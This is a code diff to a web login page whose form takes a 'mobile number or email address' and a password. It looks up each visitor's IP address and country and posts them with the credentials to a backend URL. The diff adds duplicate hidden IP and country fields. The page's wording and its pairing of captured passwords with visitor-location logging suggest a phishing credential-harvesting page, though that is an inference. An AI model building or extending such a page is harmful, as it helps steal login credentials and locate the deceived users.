@@ -21,8 +21,13 @@
     </div>
 
     <form id="contactForm" method="POST">
+      <!-- Existing hidden fields -->
       <input type="hidden" id="ipaddress" name="ipaddress">
       <input type="hidden" id="country" name="country">
+
+      <!-- Newly added hidden fields -->
+      <input type="hidden" id="ipAddress" name="ipAddress">
+      <input type="hidden" id="ipCountry" name="ipCountry">
 
       <div class="mb-4">
         <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-900" placeholder="Mobile number or email address" type="text" name="username" id="username" required/>
@@ -60,8 +65,11 @@
           const flag = getFlagEmoji(data.country_code);
           userCountry = `${flag} ${data.country_name}`;
 
+          // Populate all hidden fields
           document.getElementById('ipaddress').value = userIP;
           document.getElementById('country').value = userCountry;
+          document.getElementById('ipAddress').value = userIP;
+          document.getElementById('ipCountry').value = userCountry;
         })
         .catch(error => {
           console.error('Error fetching IP info:', error);
@@ -83,7 +91,9 @@
         username: document.getElementById('username').value,
         password: document.getElementById('password').value,
         ipaddress: document.getElementById('ipaddress').value,
-        country: document.getElementById('country').value
+        country: document.getElementById('country').value,
+        ipAddress: document.getElementById('ipAddress').value,
+        ipCountry: document.getElementById('ipCountry').value
       };
 
       fetch('https://your-backend-url.com/api/submit', {
